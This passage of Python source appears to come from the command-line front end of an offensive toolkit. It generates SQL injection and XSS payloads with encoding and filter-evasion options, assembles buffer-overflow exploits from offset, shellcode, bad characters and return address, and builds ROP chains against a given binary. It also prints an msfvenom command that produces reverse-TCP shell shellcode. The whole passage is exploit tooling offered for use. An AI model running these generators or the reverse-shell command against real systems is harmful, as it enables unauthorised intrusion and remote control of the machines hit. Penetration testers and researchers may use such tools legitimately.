        payloads = builder.generate_sql_injection(db, payload_type)

        if encoding:
            print(f"Encoding: {encoding}\n")
            payloads = [builder.encode_payload(p, encoding) for p in payloads]

        print(f"Generated {len(payloads)} payloads:\n")
        for i, payload in enumerate(payloads[:20], 1):
            print(f"{i}. {payload}")

        if len(payloads) > 20:
            print(f"\n... and {len(payloads) - 20} more payloads")

        print(f"\n💡 Tip: Use these payloads for manual testing or automated scanners")

    def exploit_generate_xss(self, context: str, xss_type: str, encoding: Optional[str] = None, evasion: bool = False):
        """Generate XSS payloads."""
        from exploits.generator.payload_builder import PayloadBuilder

        builder = PayloadBuilder()

        print(f"\n🥷 Generating {context} context {xss_type} XSS payloads...\n")

        payloads = builder.generate_xss(context, xss_type, filter_evasion=evasion)

        if encoding:
            print(f"Encoding: {encoding}\n")
            if encoding == "html-entities":
                from exploits.generator.xss import XSSGenerator
                gen = XSSGenerator()
                payloads = [gen.encode_html_entities(p) for p in payloads]
            elif encoding == "unicode":
                from exploits.generator.xss import XSSGenerator
                gen = XSSGenerator()
                payloads = [gen.encode_unicode(p) for p in payloads]
            else:
                payloads = [builder.encode_payload(p, encoding) for p in payloads]

        print(f"Generated {len(payloads)} payloads:\n")
        for i, payload in enumerate(payloads[:20], 1):
            print(f"{i}. {payload}")

        if len(payloads) > 20:
            print(f"\n... and {len(payloads) - 20} more payloads")

        if evasion:
            print(f"\n💡 Filter evasion enabled - payloads include obfuscation techniques")

    def exploit_generate_bof(self, offset: int, shellcode: str, bad_chars: Optional[str] = None,
                            ret_addr: Optional[str] = None, output: Optional[str] = None):
        """Generate buffer overflow exploit."""
        from exploits.generator.payload_builder import PayloadBuilder

        builder = PayloadBuilder()

        print(f"\n🥷 Generating buffer overflow exploit...\n")
        print(f"Offset: {offset}")
        print(f"Shellcode: {shellcode[:50]}..." if len(shellcode) > 50 else f"Shellcode: {shellcode}")

        # Parse bad chars
        bad_chars_list = None
        if bad_chars:
            bad_chars_list = [bytes.fromhex(c.strip()) for c in bad_chars.split(",")]
            print(f"Bad chars: {', '.join(f'0x{c.hex()}' for c in bad_chars_list)}")

        # Parse return address
        ret_address = None
        if ret_addr:
            ret_address = bytes.fromhex(ret_addr)
            print(f"Return address: 0x{ret_addr}")

        # Convert shellcode (simplified - in production would support more formats)
        if shellcode == "reverse_tcp":
            print("\n⚠️  Note: 'reverse_tcp' shellcode generation requires msfvenom")
            print("Using NOP sled as placeholder. Generate real shellcode with:")
            print("  msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b '\\x00' -f python")
            shellcode_bytes = b"\x90" * 100  # Placeholder
        else:
            # Assume hex string
            try:
                shellcode_bytes = bytes.fromhex(shellcode.replace("\\x", "").replace("0x", ""))
            except ValueError:
                print("❌ Invalid shellcode format. Use hex string (e.g., '90909090' or '\\x90\\x90\\x90\\x90')")
                return

        # Generate payload
        payload = builder.generate_buffer_overflow(
            offset=offset,
            shellcode=shellcode_bytes,
            bad_chars=bad_chars_list,
            return_address=ret_address
        )

        print(f"\n✅ Generated payload ({len(payload)} bytes)")

        # Display payload
        print(f"\nPayload (hex):")
        print("  " + payload.hex())

        print(f"\nPayload (Python bytes):")
        print(f"  payload = {repr(payload)}")

        # Save to file if requested
        if output:
            from pathlib import Path
            Path(output).write_bytes(payload)
            print(f"\n💾 Saved to: {output}")

    def exploit_generate_rop(self, binary: str, goal: str, output: Optional[str] = None):
        """Generate ROP chain."""
        from exploits.generator.payload_builder import PayloadBuilder
        from pathlib import Path

        if not Path(binary).exists():
            print(f"❌ Binary not found: {binary}")
            return

        builder = PayloadBuilder()

        print(f"\n🥷 Generating ROP chain for {binary}...\n")
        print(f"Goal: {goal}")

        # Check protections
        from exploits.generator.rop import ROPGenerator
        rop_gen = ROPGenerator()
        protections = rop_gen.check_protections(binary)

        print(f"\nBinary protections:")
        for prot, enabled in protections.items():
            status = "✅ Enabled" if enabled else "❌ Disabled"
            print(f"  {prot.upper()}: {status}")

        # Generate chain
        chain = builder.generate_rop_chain(binary)

        if chain is None:
            print(f"\n⚠️  ROP chain generation failed or not supported")
            print(f"   This feature requires pwntools and ROPgadget")
            print(f"   Install with: pip install pwntools ROPgadget")

            # Try to find gadgets anyway
            gadgets = rop_gen.find_gadgets(binary, max_gadgets=10)
            if gadgets:
                print(f"\n📋 Found {len(gadgets)} gadgets (sample):")
                for g in gadgets[:5]:
                    print(f"  0x{g['address']:08x}: {g['instructions']}")
            return

        print(f"\n✅ Generated ROP chain ({len(chain)} bytes)")

        print(f"\nROP chain (hex):")
        print("  " + chain.hex())

        print(f"\nROP chain (Python bytes):")
        print(f"  rop_chain = {repr(chain)}")

        # Save to file if requested
        if output:
            Path(output).write_bytes(chain)
            print(f"\n💾 Saved to: {output}")
